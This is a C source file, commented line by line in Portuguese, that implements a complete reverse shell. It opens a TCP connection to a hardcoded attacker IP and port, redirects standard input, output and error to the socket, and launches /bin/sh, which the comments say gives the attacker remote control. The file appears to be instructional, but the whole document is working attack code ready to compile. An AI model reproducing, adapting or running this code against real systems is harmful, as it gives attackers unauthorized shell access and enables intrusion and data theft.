#include <stdio.h>              // Biblioteca padrão de I/O (não usada diretamente aqui, pode ser removida)
#include <unistd.h>             // Fornece funções como dup2() e execve()
#include <netinet/in.h>         // Define estruturas e constantes para sockets de internet (AF_INET)
#include <sys/types.h>          // Define tipos usados em chamadas de sistema
#include <sys/socket.h>         // Fornece funções e estruturas para programação com sockets

// Define o endereço IP e a porta do atacante (listener que vai receber a conexão reversa)
#define REMOTE_ADDR "192.168.0.5"
#define REMOTE_PORT 1337

int main(int argc, char *argv[])
{
    struct sockaddr_in sa;     // Estrutura que armazenará informações do socket (endereço e porta)
    int s;                     // Descritor do socket

    // Define a família do endereço como IPv4
    sa.sin_family = AF_INET;

    // Converte o endereço IP em string para formato binário
    sa.sin_addr.s_addr = inet_addr(REMOTE_ADDR);

    // Converte a porta para o formato de rede (big-endian)
    sa.sin_port = htons(REMOTE_PORT);

    // Cria um socket do tipo TCP (SOCK_STREAM) usando IPv4 (AF_INET)
    s = socket(AF_INET, SOCK_STREAM, 0);

    // Conecta ao endereço IP e porta definidos acima (ou seja, conecta ao atacante)
    connect(s, (struct sockaddr *)&sa, sizeof(sa));

    // Redireciona a entrada padrão (stdin), saída padrão (stdout) e erro padrão (stderr) para o socket
    dup2(s, 0); // stdin
    dup2(s, 1); // stdout
    dup2(s, 2); // stderr

    // Executa o shell "/bin/sh", usando o socket como I/O. Isso dá controle remoto ao atacante.
    execve("/bin/sh", 0, 0);

    return 0;
}
